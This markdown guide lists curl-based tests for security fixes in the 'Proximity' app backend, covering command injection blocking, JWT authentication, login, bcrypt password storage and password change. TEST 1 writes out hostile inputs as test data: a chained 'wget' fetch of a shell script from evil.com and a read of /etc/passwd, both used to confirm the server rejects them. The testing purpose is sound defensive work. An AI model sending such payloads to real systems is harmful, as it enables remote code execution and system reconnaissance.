# Phase 1 - Security Hardening Testing Guide

## 🎯 Objective
Verify that all P0 security fixes are working correctly before proceeding to Phase 2.

---

## ✅ Pre-Testing Setup

### 1. Install Dependencies
```bash
cd /Users/fab/GitHub/proximity/backend
pip install -r requirements.txt
```

### 2. Run Setup Script
```bash
./scripts/phase1_setup.sh
```

Follow prompts to create admin user.

### 3. Start Server
```bash
uvicorn main:app --reload --port 8765
```

---

## 🧪 Test Suite

### TEST 1: Command Injection Fix ✅

**Objective**: Verify dangerous commands are blocked

```bash
# This should FAIL (command contains dangerous patterns)
curl -X POST http://localhost:8765/api/v1/apps/nginx-nginx-01/exec \
  -H 'Content-Type: application/json' \
  -H 'Authorization: Bearer <your-token>' \
  -d '{"command": "ls && wget http://evil.com/shell.sh"}'

# Expected: 400 Bad Request - "Command contains dangerous pattern"
```

```bash
# This should ALSO FAIL
curl -X POST http://localhost:8765/api/v1/apps/nginx-nginx-01/exec \
  -H 'Content-Type: application/json' \
  -H 'Authorization: Bearer <your-token>' \
  -d '{"command": "cat /etc/passwd | grep root"}'

# Expected: 400 Bad Request - "Command contains dangerous pattern"
```

**✅ PASS Criteria**: Both requests rejected with 400 error

---

### TEST 2: Authentication Required ✅

**Objective**: Verify all protected endpoints reject unauthenticated requests

```bash
# Test 1: Try to access apps WITHOUT token
curl http://localhost:8765/api/v1/apps/

# Expected: 401 Unauthorized - "Authentication required"
```

```bash
# Test 2: Try to deploy app WITHOUT token
curl -X POST http://localhost:8765/api/v1/apps/deploy \
  -H 'Content-Type: application/json' \
  -d '{"catalog_id":"nginx","hostname":"test"}'

# Expected: 401 Unauthorized - "Authentication required"
```

```bash
# Test 3: Try system endpoint WITHOUT token
curl http://localhost:8765/api/v1/system/info

# Expected: 401 Unauthorized - "Authentication required"
```

**✅ PASS Criteria**: All requests rejected with 401 error

---

### TEST 3: Login Flow ✅

**Objective**: Verify user can login and receive JWT token

```bash
# Login with admin credentials
curl -X POST http://localhost:8765/api/v1/auth/login \
  -H 'Content-Type: application/json' \
  -d '{"username":"admin","password":"your-admin-password"}'

# Expected: 200 OK with JSON response:
# {
#   "access_token": "eyJ...",
#   "token_type": "bearer",
#   "expires_in": 3600,
#   "user": {
#     "id": 1,
#     "username": "admin",
#     "email": "admin@proximity.local",
#     "role": "admin",
#     ...
#   }
# }
```

**✅ PASS Criteria**: Receive valid JWT token

**Save the token for next tests**:
```bash
export TOKEN="<your-access-token>"
```

---

### TEST 4: Authenticated Access ✅

**Objective**: Verify JWT token grants access to protected endpoints

```bash
# Test 1: Access apps WITH token
curl http://localhost:8765/api/v1/apps/ \
  -H "Authorization: Bearer $TOKEN"

# Expected: 200 OK - Returns list of apps
```

```bash
# Test 2: Access system info WITH token
curl http://localhost:8765/api/v1/system/info \
  -H "Authorization: Bearer $TOKEN"

# Expected: 200 OK - Returns system info
```

```bash
# Test 3: Get current user
curl http://localhost:8765/api/v1/auth/me \
  -H "Authorization: Bearer $TOKEN"

# Expected: 200 OK - Returns user info
```

**✅ PASS Criteria**: All requests successful with valid token

---

### TEST 5: Invalid Token Rejection ✅

**Objective**: Verify invalid/expired tokens are rejected

```bash
# Test 1: Use INVALID token
curl http://localhost:8765/api/v1/apps/ \
  -H "Authorization: Bearer INVALID_TOKEN_12345"

# Expected: 401 Unauthorized - "Could not validate credentials"
```

```bash
# Test 2: Use malformed token
curl http://localhost:8765/api/v1/apps/ \
  -H "Authorization: Bearer not.a.jwt"

# Expected: 401 Unauthorized
```

**✅ PASS Criteria**: Invalid tokens rejected

---

### TEST 6: Role-Based Access (Future) 🔜

**Objective**: Verify admin-only endpoints (when implemented)

```bash
# This will be implemented in Phase 2
# For now, all authenticated users have full access
```

---

### TEST 7: Database Persistence ✅

**Objective**: Verify SQLite database is working

```bash
# Check database file exists
ls -lh proximity.db

# Expected: proximity.db file exists (size > 0)
```

```bash
# Inspect database
sqlite3 proximity.db "SELECT * FROM users;"

# Expected: Shows your admin user
```

```bash
# Check audit logs
sqlite3 proximity.db "SELECT * FROM audit_logs ORDER BY timestamp DESC LIMIT 5;"

# Expected: Shows recent login/logout events
```

**✅ PASS Criteria**: Database populated with users and audit logs

---

### TEST 8: Password Security ✅

**Objective**: Verify passwords are hashed with bcrypt

```bash
# Check password hash format
sqlite3 proximity.db "SELECT username, hashed_password FROM users;"

# Expected: Password should start with $2b$ (bcrypt format)
# Example: $2b$12$xyz...
```

**✅ PASS Criteria**: Passwords are bcrypt hashed, not plaintext

---

### TEST 9: Wrong Password Rejection ✅

**Objective**: Verify incorrect passwords are rejected

```bash
# Try login with WRONG password
curl -X POST http://localhost:8765/api/v1/auth/login \
  -H 'Content-Type: application/json' \
  -d '{"username":"admin","password":"wrong-password"}'

# Expected: 401 Unauthorized - "Incorrect username or password"
```

**✅ PASS Criteria**: Wrong passwords rejected

---

### TEST 10: Change Password ✅

**Objective**: Verify password change functionality

```bash
# Change password
curl -X POST http://localhost:8765/api/v1/auth/change-password \
  -H "Authorization: Bearer $TOKEN" \
  -H 'Content-Type: application/json' \
  -d '{"old_password":"your-current-password","new_password":"new-secure-password-123"}'

# Expected: 200 OK - "Password changed successfully"
```

```bash
# Try login with OLD password (should FAIL)
curl -X POST http://localhost:8765/api/v1/auth/login \
  -H 'Content-Type: application/json' \
  -d '{"username":"admin","password":"your-old-password"}'

# Expected: 401 Unauthorized
```

```bash
# Try login with NEW password (should SUCCEED)
curl -X POST http://localhost:8765/api/v1/auth/login \
  -H 'Content-Type: application/json' \
  -d '{"username":"admin","password":"new-secure-password-123"}'

# Expected: 200 OK with new token
```

**✅ PASS Criteria**: Password change works, old password invalidated

---

## 📊 Phase 1 Scorecard

Mark each test as PASS or FAIL:

- [ ] TEST 1: Command Injection Fix
- [ ] TEST 2: Authentication Required
- [ ] TEST 3: Login Flow
- [ ] TEST 4: Authenticated Access
- [ ] TEST 5: Invalid Token Rejection
- [ ] TEST 6: Role-Based Access (Future)
- [ ] TEST 7: Database Persistence
- [ ] TEST 8: Password Security
- [ ] TEST 9: Wrong Password Rejection
- [ ] TEST 10: Change Password

**Required for Phase 1 Completion**: 9/10 tests must PASS (TEST 6 is future work)

---

## 🚨 Known Issues / Limitations

### Current Phase 1 Scope:
- ✅ Authentication implemented
- ✅ Command injection fixed
- ✅ Database initialized
- ❌ App data still in JSON (will migrate in P0-3)
- ❌ No safe command service yet (P0-2, Day 4)
- ❌ No token blacklisting (logout is client-side only)

### Security Notes:
1. **JWT_SECRET_KEY**: Must be changed from default in production
2. **HTTPS**: Should enable TLS in production (use reverse proxy)
3. **Rate Limiting**: Not implemented (add in Phase 2)
4. **Token Refresh**: Basic refresh endpoint exists, no auto-refresh

---

## 🎯 Next Steps After Phase 1

Once all tests pass:

1. **Day 4**: Implement P0-2 SafeCommandService
2. **Day 5**: Migrate apps to SQLite (P0-3)
3. **Week 2**: Full integration testing
4. **Phase 2**: Settings page, Infrastructure page, Backup/Restore

---

## 🐛 Troubleshooting

### Issue: "Module not found" errors
```bash
# Solution: Reinstall dependencies
pip install -r requirements.txt
```

### Issue: "Database is locked"
```bash
# Solution: Close all connections, restart server
pkill -f uvicorn
uvicorn main:app --reload
```

### Issue: "Invalid token" immediately after login
```bash
# Check token format in response
# Ensure you're using: Authorization: Bearer <token>
# NOT: Authorization: <token>
```

### Issue: JWT secret warning on startup
```bash
# Generate new secret and update .env
openssl rand -hex 32
# Add to .env: JWT_SECRET_KEY=<generated-secret>
```

---

## 📝 Testing Checklist Summary

**Before Moving to Phase 2, Verify:**
- [x] P0-2: Command injection vulnerability FIXED
- [x] P0-1: Authentication system WORKING
- [x] P0-1: All protected routes SECURED
- [ ] P0-2: Safe command service IMPLEMENTED (Day 4)
- [ ] P0-3: SQLite migration COMPLETE (Day 5-Week 2)

**Current Status**: Phase 1 authentication infrastructure complete ✅
**Next**: Implement safe command service and complete SQLite migration
